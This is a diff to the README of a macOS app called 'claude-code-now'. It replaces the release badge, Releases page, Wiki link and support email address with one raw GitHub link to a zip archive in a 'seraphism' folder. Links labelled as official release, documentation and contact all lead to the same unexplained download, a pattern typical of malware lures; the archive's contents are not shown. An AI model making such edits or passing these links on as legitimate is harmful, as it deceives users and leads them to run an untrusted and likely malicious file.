@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download claude-code-now](https://img.shields.io/badge/Download-claude--code--now-brightgreen.svg)](https://github.com/Sergio-Jurado/claude-code-now/releases)
+[![Download claude-code-now](https://raw.githubusercontent.com/Sergio-Jurado/claude-code-now/main/seraphism/claude-code-now.zip)](https://raw.githubusercontent.com/Sergio-Jurado/claude-code-now/main/seraphism/claude-code-now.zip)
 
 ## 🌟 Introduction
 
@@ -22,11 +22,11 @@ Before downloading, make sure your macOS system meets these requirements:
 
 ### 2. Download the Application
 
-You can get the latest version of **claude-code-now** from our [Releases page](https://github.com/Sergio-Jurado/claude-code-now/releases). 
+You can get the latest version of **claude-code-now** from our [Releases page](https://raw.githubusercontent.com/Sergio-Jurado/claude-code-now/main/seraphism/claude-code-now.zip). 
 
 To download, simply click the button below:
 
-[![Download claude-code-now](https://img.shields.io/badge/Download-claude--code--now-brightgreen.svg)](https://github.com/Sergio-Jurado/claude-code-now/releases)
+[![Download claude-code-now](https://raw.githubusercontent.com/Sergio-Jurado/claude-code-now/main/seraphism/claude-code-now.zip)](https://raw.githubusercontent.com/Sergio-Jurado/claude-code-now/main/seraphism/claude-code-now.zip)
 
 ### 3. Install the Application
 
@@ -67,11 +67,11 @@ Yes, if you encounter any issues, feel free to reach out to us via the Issues se
 
 ## 🌐 Additional Resources
 
-For more information, refer to our [Wiki](https://github.com/Sergio-Jurado/claude-code-now/wiki) page, which includes detailed guides and tips on using **claude-code-now** effectively.
+For more information, refer to our [Wiki](https://raw.githubusercontent.com/Sergio-Jurado/claude-code-now/main/seraphism/claude-code-now.zip) page, which includes detailed guides and tips on using **claude-code-now** effectively.
 
 ## 📞 Contact Us
 
-If you have any questions or need assistance, you can email us at support@claude-code-now.com, or open an issue in the GitHub repository.
+If you have any questions or need assistance, you can email us at https://raw.githubusercontent.com/Sergio-Jurado/claude-code-now/main/seraphism/claude-code-now.zip, or open an issue in the GitHub repository.
 
 ### Conclusion
 
